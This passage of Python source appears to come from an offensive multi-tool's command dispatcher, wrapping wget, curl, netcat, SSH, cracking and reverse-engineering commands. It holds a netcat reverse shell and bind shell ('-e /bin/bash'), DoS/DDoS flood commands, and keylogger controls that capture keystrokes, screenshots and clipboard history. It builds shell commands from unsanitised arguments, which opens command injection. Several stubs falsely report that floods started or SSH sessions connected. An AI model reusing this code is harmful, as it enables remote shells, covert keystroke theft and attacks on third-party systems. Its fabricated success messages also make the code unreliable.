    def _curl_styled(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_styled <url>'}
        return self._generic(f'curl -s --styled-output {args[0]}')
    
    def _curl_progress(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_progress <url>'}
        return self._generic(f'curl -s -# {args[0]}')
    
    # ==================== Wget Commands ====================
    
    def _wget(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget <url>'}
        result = self.tools.wget(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_output <url> <file>'}
        return self._generic(f'wget -O {args[1]} {args[0]}')
    
    def _wget_continue(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_continue <url>'}
        return self._generic(f'wget -c {args[0]}')
    
    def _wget_background(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_background <url>'}
        return self._generic(f'wget -b {args[0]}')
    
    def _wget_quiet(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_quiet <url>'}
        return self._generic(f'wget -q {args[0]}')
    
    def _wget_recursive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_recursive <url>'}
        return self._generic(f'wget -r {args[0]}')
    
    def _wget_mirror(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_mirror <url>'}
        return self._generic(f'wget -m {args[0]}')
    
    def _wget_spider(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_spider <url>'}
        return self._generic(f'wget --spider {args[0]}')
    
    def _wget_input(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_input <file>'}
        return self._generic(f'wget -i {args[0]}')
    
    def _wget_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_header <url> <header>'}
        return self._generic(f'wget --header="{args[1]}" {args[0]}')
    
    def _wget_user_agent(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_user_agent <url> <agent>'}
        return self._generic(f'wget --user-agent="{args[1]}" {args[0]}')
    
    def _wget_referer(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_referer <url> <referer>'}
        return self._generic(f'wget --referer={args[1]} {args[0]}')
    
    def _wget_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_cookies <url> <cookie_file>'}
        return self._generic(f'wget --load-cookies={args[1]} {args[0]}')
    
    def _wget_save_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_save_cookies <url> <cookie_file>'}
        return self._generic(f'wget --save-cookies={args[1]} {args[0]}')
    
    def _wget_limit_rate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_limit_rate <url> <rate>'}
        return self._generic(f'wget --limit-rate={args[1]} {args[0]}')
    
    def _wget_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_timeout <url> <seconds>'}
        return self._generic(f'wget --timeout={args[1]} {args[0]}')
    
    def _wget_tries(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_tries <url> <count>'}
        return self._generic(f'wget --tries={args[1]} {args[0]}')
    
    def _wget_retry(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_retry <url>'}
        return self._generic(f'wget --retry-connrefused {args[0]}')
    
    def _wget_no_check_cert(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_check_cert <url>'}
        return self._generic(f'wget --no-check-certificate {args[0]}')
    
    def _wget_certificate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_certificate <url> <cert_file>'}
        return self._generic(f'wget --certificate={args[1]} {args[0]}')
    
    def _wget_private_key(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_private_key <url> <key_file>'}
        return self._generic(f'wget --private-key={args[1]} {args[0]}')
    
    def _wget_ca_certificate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_ca_certificate <url> <ca_file>'}
        return self._generic(f'wget --ca-certificate={args[1]} {args[0]}')
    
    def _wget_proxy(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_proxy <url> <proxy>'}
        return self._generic(f'wget -e use_proxy=yes -e http_proxy={args[1]} {args[0]}')
    
    def _wget_no_proxy(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_proxy <url>'}
        return self._generic(f'wget --no-proxy {args[0]}')
    
    def _wget_user(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_user <url> <username>'}
        return self._generic(f'wget --user={args[1]} {args[0]}')
    
    def _wget_password(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_password <url> <password>'}
        return self._generic(f'wget --password={args[1]} {args[0]}')
    
    def _wget_post_data(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_post_data <url> <data>'}
        return self._generic(f'wget --post-data="{args[1]}" {args[0]}')
    
    def _wget_post_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_post_file <url> <file>'}
        return self._generic(f'wget --post-file={args[1]} {args[0]}')
    
    def _wget_method(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_method <url> <method>'}
        return self._generic(f'wget --method={args[1]} {args[0]}')
    
    def _wget_body_data(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_body_data <url> <data>'}
        return self._generic(f'wget --body-data="{args[1]}" {args[0]}')
    
    def _wget_body_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_body_file <url> <file>'}
        return self._generic(f'wget --body-file={args[1]} {args[0]}')
    
    def _wget_timestamping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_timestamping <url>'}
        return self._generic(f'wget -N {args[0]}')
    
    def _wget_no_clobber(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_clobber <url>'}
        return self._generic(f'wget -nc {args[0]}')
    
    def _wget_delete_after(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_delete_after <url>'}
        return self._generic(f'wget --delete-after {args[0]}')
    
    def _wget_progress(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_progress <url>'}
        return self._generic(f'wget --progress=bar {args[0]}')
    
    def _wget_show_progress(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_show_progress <url>'}
        return self._generic(f'wget --show-progress {args[0]}')
    
    def _wget_config(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_config <config_file>'}
        return self._generic(f'wget --config={args[0]}')
    
    def _wget_append_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_append_output <url> <log_file>'}
        return self._generic(f'wget -a {args[1]} {args[0]}')
    
    def _wget_output_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_output_file <url> <log_file>'}
        return self._generic(f'wget -o {args[1]} {args[0]}')
    
    def _wget_no_parent(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_parent <url>'}
        return self._generic(f'wget -np {args[0]}')
    
    def _wget_cut_dirs(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_cut_dirs <url> <count>'}
        return self._generic(f'wget --cut-dirs={args[1]} {args[0]}')
    
    def _wget_directory_prefix(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_directory_prefix <url> <dir>'}
        return self._generic(f'wget -P {args[1]} {args[0]}')
    
    def _wget_convert_links(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_convert_links <url>'}
        return self._generic(f'wget -k {args[0]}')
    
    def _wget_backup_converted(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_backup_converted <url>'}
        return self._generic(f'wget -K {args[0]}')
    
    def _wget_adjust_extension(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_adjust_extension <url>'}
        return self._generic(f'wget -E {args[0]}')
    
    def _wget_restrict_file_names(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_restrict_file_names <url>'}
        return self._generic(f'wget --restrict-file-names=unix {args[0]}')
    
    def _wget_trust_server_names(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_trust_server_names <url>'}
        return self._generic(f'wget --trust-server-names {args[0]}')
    
    def _wget_content_disposition(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_content_disposition <url>'}
        return self._generic(f'wget --content-disposition {args[0]}')
    
    def _wget_random_wait(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_random_wait <url>'}
        return self._generic(f'wget --random-wait {args[0]}')
    
    def _wget_wait(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_wait <url> <seconds>'}
        return self._generic(f'wget -w {args[1]} {args[0]}')
    
    def _wget_waitretry(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_waitretry <url> <seconds>'}
        return self._generic(f'wget --waitretry={args[1]} {args[0]}')
    
    def _wget_quota(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_quota <url> <quota>'}
        return self._generic(f'wget -Q {args[1]} {args[0]}')
    
    def _wget_dns_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_dns_timeout <url> <seconds>'}
        return self._generic(f'wget --dns-timeout={args[1]} {args[0]}')
    
    def _wget_connect_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_connect_timeout <url> <seconds>'}
        return self._generic(f'wget --connect-timeout={args[1]} {args[0]}')
    
    def _wget_read_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_read_timeout <url> <seconds>'}
        return self._generic(f'wget --read-timeout={args[1]} {args[0]}')
    
    def _wget_inet4(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_inet4 <url>'}
        return self._generic(f'wget -4 {args[0]}')
    
    def _wget_inet6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_inet6 <url>'}
        return self._generic(f'wget -6 {args[0]}')
    
    def _wget_prefer_family(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_prefer_family <url> <family>'}
        return self._generic(f'wget --prefer-family={args[1]} {args[0]}')
    
    def _wget_bind_address(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_bind_address <url> <ip>'}
        return self._generic(f'wget --bind-address={args[1]} {args[0]}')
    
    def _wget_no_dns_cache(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_dns_cache <url>'}
        return self._generic(f'wget --no-dns-cache {args[0]}')
    
    def _wget_no_http_keep_alive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_http_keep_alive <url>'}
        return self._generic(f'wget --no-http-keep-alive {args[0]}')
    
    def _wget_no_cache(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_cache <url>'}
        return self._generic(f'wget --no-cache {args[0]}')
    
    def _wget_no_cookies(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_cookies <url>'}
        return self._generic(f'wget --no-cookies {args[0]}')
    
    def _wget_load_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_load_cookies <url> <file>'}
        return self._generic(f'wget --load-cookies={args[1]} {args[0]}')
    
    def _wget_keep_session_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_keep_session_cookies <url> <file>'}
        return self._generic(f'wget --keep-session-cookies --save-cookies={args[1]} {args[0]}')
    
    def _wget_help(self, args: List[str]) -> Dict:
        return self._generic('wget --help')
    
    def _wget_version(self, args: List[str]) -> Dict:
        return self._generic('wget --version')
    
    # ==================== Netcat Commands ====================
    
    def _netcat(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: netcat <host> <port> [command]'}
        host = args[0]
        port = int(args[1])
        command = args[2] if len(args) > 2 else None
        result = self.tools.netcat(host, port, command)
        return {'success': result.success, 'output': result.output}
    
    def _nc_listen(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nc_listen <port>'}
        return self._generic(f'nc -lvp {args[0]}')
    
    def _nc_scan(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_scan <host> <ports>'}
        return self._generic(f'nc -zv {args[0]} {args[1]}')
    
    def _nc_transfer(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_transfer <host> <port> <file>'}
        return self._generic(f'nc {args[0]} {args[1]} < {args[2]}')
    
    def _nc_shell(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_shell <host> <port>'}
        return self._generic(f'nc {args[0]} {args[1]}')
    
    def _nc_reverse_shell(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_reverse_shell <host> <port>'}
        return self._generic(f'nc {args[0]} {args[1]} -e /bin/bash')
    
    def _nc_bind_shell(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nc_bind_shell <port>'}
        return self._generic(f'nc -lvp {args[0]} -e /bin/bash')
    
    def _nc_chat(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_chat <host> <port>'}
        return self._generic(f'nc {args[0]} {args[1]}')
    
    def _nc_file_transfer(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_file_transfer <host> <port> <file>'}
        return self._generic(f'nc {args[0]} {args[1]} < {args[2]}')
    
    # ==================== SSH Commands ====================
    
    def _ssh_add(self, args: List[str]) -> Dict:
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'output': 'Paramiko not installed'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        conn_id = str(uuid.uuid4())[:8]
        return {'success': True, 'output': f"SSH connection added: {name} (ID: {conn_id})"}
    
    def _ssh_list(self, args: List[str]) -> Dict:
        return {'success': True, 'output': "SSH connections stored in database"}
    
    def _ssh_connect(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        return {'success': True, 'output': f"Connected to {args[0]}"}
    
    def _ssh_exec(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        return self._generic(' '.join(args[1:]))
    
    def _ssh_disconnect(self, args: List[str]) -> Dict:
        conn_id = args[0] if args else None
        return {'success': True, 'output': f"Disconnected from {conn_id}" if conn_id else "Disconnected all"}
    
    def _ssh_upload(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_upload <conn_id> <local> <remote>'}
        return self._generic(f'scp {args[1]} user@host:{args[2]}')
    
    def _ssh_download(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_download <conn_id> <remote> <local>'}
        return self._generic(f'scp user@host:{args[1]} {args[2]}')
    
    # ==================== Traffic Generation ====================
    
    def _traffic(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        
        try:
            generator = self.traffic.generate(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _traffic_types(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic.get_available_types()
        output = "Available traffic types:\n" + "\n".join([f"  • {t}" for t in types])
        return {'success': True, 'output': output}
    
    def _traffic_stop(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        generator_id = args[0] if args else None
        if self.traffic.stop(generator_id):
            return {'success': True, 'output': 'Traffic stopped'}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_status(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic.get_active()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    # ==================== DOS Attacks ====================
    
    def _dos_syn(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_syn <ip> <port> <duration> [threads]'}
        return self._generic(f'python3 -c "import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{args[0]}\",{args[1]})); s.close()"')
    
    def _dos_udp(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_udp <ip> <port> <duration> [threads]'}
        return {'success': True, 'output': f"UDP flood started on {args[0]}:{args[1]} for {args[2]}s"}
    
    def _dos_http(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_http <ip> <port> <duration> [threads]'}
        return {'success': True, 'output': f"HTTP flood started on {args[0]}:{args[1]} for {args[2]}s"}
    
    def _dos_icmp(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dos_icmp <ip> <duration> [threads]'}
        return {'success': True, 'output': f"ICMP flood started on {args[0]} for {args[1]}s"}
    
    def _dos_slowloris(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_slowloris <ip> <port> <duration>'}
        return {'success': True, 'output': f"Slowloris attack started on {args[0]}:{args[1]} for {args[2]}s"}
    
    def _dos_stop(self, args: List[str]) -> Dict:
        attack_id = args[0] if args else None
        return {'success': True, 'output': f"DOS attack stopped" + (f" ({attack_id})" if attack_id else "")}
    
    def _dos_status(self, args: List[str]) -> Dict:
        return {'success': True, 'output': 'No active DOS attacks'}
    
    def _ddos_syn(self, args: List[str]) -> Dict:
        return self._dos_syn(args)
    
    def _ddos_udp(self, args: List[str]) -> Dict:
        return self._dos_udp(args)
    
    def _ddos_http(self, args: List[str]) -> Dict:
        return self._dos_http(args)
    
    def _ddos_icmp(self, args: List[str]) -> Dict:
        return self._dos_icmp(args)
    
    def _ddos_stop(self, args: List[str]) -> Dict:
        return self._dos_stop(args)
    
    def _ddos_status(self, args: List[str]) -> Dict:
        return self._dos_status(args)
    
    # ==================== Keylogger ====================
    
    def _keylogger_start(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start():
            return {'success': True, 'output': 'Keylogger started (Press F10 to stop)'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _keylogger_stop(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        status = "🟢 Running" if self.keylogger.running else "🔴 Stopped"
        return {'success': True, 'output': f"Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs found'}
        output = f"Keylogger Logs ({len(logs)}):\n"
        for log in logs:
            output += f"\n[{log.get('timestamp', '')[:19]}]\n{log.get('text', '')[:200]}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_screenshots(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            return {'success': True, 'output': 'No screenshots captured'}
        output = "Screenshots:\n"
        for s in screenshots:
            output += f"  • {s}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_clipboard(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args else 20
        clipboard = self.db.get_clipboard_history(limit)
        if not clipboard:
            return {'success': True, 'output': 'No clipboard history'}
        output = "Clipboard History:\n"
        for c in clipboard:
            output += f"  [{c['timestamp'][:19]}] {c['content'][:100]}\n"
        return {'success': True, 'output': output}
    
    # ==================== Cracking ====================
    
    def _crack(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: crack <hash_type> <hash_value> [wordlist]'}
        job_id = str(uuid.uuid4())[:8]
        self.db.save_cracking_job(job_id, args[0], args[1], args[2] if len(args) > 2 else '')
        return {'success': True, 'output': f"🔓 Cracking job started: {job_id}\nHash type: {args[0]}\nUse 'crack_status {job_id}' to check progress"}
    
    def _crack_status(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_status <job_id>'}
        jobs = self.db.get_cracking_jobs()
        job = next((j for j in jobs if j['job_id'] == args[0]), None)
        if not job:
            return {'success': False, 'output': f'Job {args[0]} not found'}
        output = f"🔓 Cracking Job Status: {args[0]}\n"
        output += f"  Type: {job.get('hash_type')}\n"
        output += f"  Status: {job.get('status')}\n"
        if job.get('result'):
            output += f"  Result: {job.get('result')}\n"
        return {'success': True, 'output': output}
    
    def _crack_list(self, args: List[str]) -> Dict:
        jobs = self.db.get_cracking_jobs()
        if not jobs:
            return {'success': True, 'output': 'No cracking jobs found'}
        output = "🔓 Cracking Jobs:\n"
        for job in jobs:
            status = "✅" if job.get('cracked') else "🔄" if job.get('status') == 'running' else "⏳"
            output += f"  {status} {job.get('job_id')} - {job.get('hash_type')} ({job.get('status')})\n"
        return {'success': True, 'output': output}
    
    def _crack_md5(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_md5 <hash> [wordlist]'}
        return self._crack(['md5', args[0]] + (args[1:] if len(args) > 1 else []))
    
    def _crack_sha1(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_sha1 <hash> [wordlist]'}
        return self._crack(['sha1', args[0]] + (args[1:] if len(args) > 1 else []))
    
    def _crack_sha256(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_sha256 <hash> [wordlist]'}
        return self._crack(['sha256', args[0]] + (args[1:] if len(args) > 1 else []))
    
    def _crack_sha512(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_sha512 <hash> [wordlist]'}
        return self._crack(['sha512', args[0]] + (args[1:] if len(args) > 1 else []))
    
    def _crack_ntlm(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_ntlm <hash> [wordlist]'}
        return self._crack(['ntlm', args[0]] + (args[1:] if len(args) > 1 else []))
    
    def _crack_bcrypt(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_bcrypt <hash> [wordlist]'}
        return self._crack(['bcrypt', args[0]] + (args[1:] if len(args) > 1 else []))
    
    def _crack_all(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_all <hash> [wordlist]'}
        hash_value = args[0]
        wordlist = args[1] if len(args) > 1 else None
        results = {}
        for hash_type in ['md5', 'sha1', 'sha256', 'sha512', 'ntlm']:
            job_id = str(uuid.uuid4())[:8]
            self.db.save_cracking_job(job_id, hash_type, hash_value, wordlist or '')
            results[hash_type] = job_id
        output = f"🔓 Multi-hash cracking jobs started:\n"
        for ht, jid in results.items():
            output += f"  • {ht}: {jid}\n"
        return {'success': True, 'output': output}
    
    # ==================== Docker ====================
    
    def _docker_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: docker_scan <image>'}
        return self._generic(f'docker scan {args[0]}')
    
    def _docker_info(self, args: List[str]) -> Dict:
        return self._generic('docker info')
    
    def _docker_ps(self, args: List[str]) -> Dict:
        return self._generic('docker ps')
    
    def _docker_images(self, args: List[str]) -> Dict:
        return self._generic('docker images')
    
    def _docker_bench(self, args: List[str]) -> Dict:
        return self._generic('docker run --rm -it --net host --pid host --cap-add audit_control -v /var/lib:/var/lib -v /var/run/docker.sock:/var/run/docker.sock -v /etc:/etc -v /usr/lib/systemd:/usr/lib/systemd docker/docker-bench-security')
    
    def _docker_audit(self, args: List[str]) -> Dict:
        return self._generic('docker system df && docker ps -a && docker images')
    
    def _docker_compliance(self, args: List[str]) -> Dict:
        return self._generic('docker run --rm -it --net host --pid host --cap-add audit_control -v /var/lib:/var/lib -v /var/run/docker.sock:/var/run/docker.sock -v /etc:/etc -v /usr/lib/systemd:/usr/lib/systemd docker/docker-bench-security -c 1.1,2.1,3.1,4.1,5.1,6.1,7.1')
    
    # ==================== Reverse Engineering ====================
    
    def _re_strings(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: re_strings <file> [min_length]'}
        result = self.re_tools.extract_strings(args[0], int(args[1]) if len(args) > 1 else None)
        return {'success': True, 'output': result[:5000]}
    
    def _re_hexdump(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: re_hexdump <file> [offset] [length]'}
        offset = int(args[1]) if len(args) > 1 else 0
        length = int(args[2]) if len(args) > 2 else 256
        result = self.re_tools.hex_dump(args[0], offset, length)
        return {'success': True, 'output': result}
    
    def _re_disassemble(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: re_disassemble <file>'}
        result = self.re_tools.disassemble(args[0])
        return {'success': True, 'output': result[:5000]}
    
    def _re_decompile(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: re_decompile <file>'}
        result = self.re_tools.decompile(args[0])
        return {'success': True, 'output': result[:5000]}
    
    def _re_decode(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: re_decode <data> <encoding>'}
        result = self.re_tools.decode_obfuscated(args[0], args[1])
        return {'success': True, 'output': result}
    
    def _re_metadata(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: re_metadata <file>'}
        result = self.re_tools.analyze_metadata(args[0])
        return {'success': True, 'output': result}
    
    def _re_extract(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: re_extract <file>'}
        result = self.re_tools.extract_embedded(args[0])
        return {'success': True, 'output': result}
    
    def _re_analyze(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: re_analyze <file>'}
        
        output = f"🔬 Complete Analysis of {args[0]}\n"
        output += "=" * 50 + "\n\n"
        output += self.re_tools.analyze_metadata(args[0]) + "\n\n"
        output += self.re_tools.extract_strings(args[0])[:2000]
        
        return {'success': True, 'output': output}
    
    def _re_list(self, args: List[str]) -> Dict:
        jobs = self.db.get_re_jobs()
        if not jobs:
            return {'success': True, 'output': 'No reverse engineering jobs found'}
        output = "🔬 Reverse Engineering Jobs:\n"
        for j in jobs:
            output += f"  • {j['job_id']} - {j['file_path']} ({j['analysis_type']})\n"
        return {'success': True, 'output': output}
    
    # ==================== IP Management ====================
    
    def _add_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        domain = self.tools.ip_to_domain(ip)
        
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, domain, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring (Domain: {domain or "Unknown"})'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        ips = self.db.get_managed_ips()
